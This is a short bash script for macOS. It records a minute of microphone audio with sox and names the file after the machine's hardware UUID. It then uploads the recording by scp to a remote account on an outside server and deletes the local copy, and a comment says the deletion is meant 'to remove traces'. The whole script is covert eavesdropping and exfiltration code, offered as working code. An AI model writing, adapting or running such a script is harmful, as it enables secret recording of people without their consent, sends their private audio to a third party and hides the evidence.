#!/bin/bash

# https://stackoverflow.com/questions/14757720/how-to-record-sound-in-os-x-terminal
# brew update
# brew install sox
# brew install coreutils

# timestamp=$(date +%s)
uuid=$(ioreg -d2 -c IOPlatformExpertDevice | awk -F\" '/IOPlatformUUID/{print $(NF-1)}')

# record audio for 1 minute, upload to server
gtimeout 60 sox -d $uuid-audio.mp3

# Upload file to server
scp $uuid-audio.mp3 eudomus@metricspot.com:/home/eudomus/webapps/macdefense

# Delete file from local folder to remove traces
rm $uuid-audio.mp3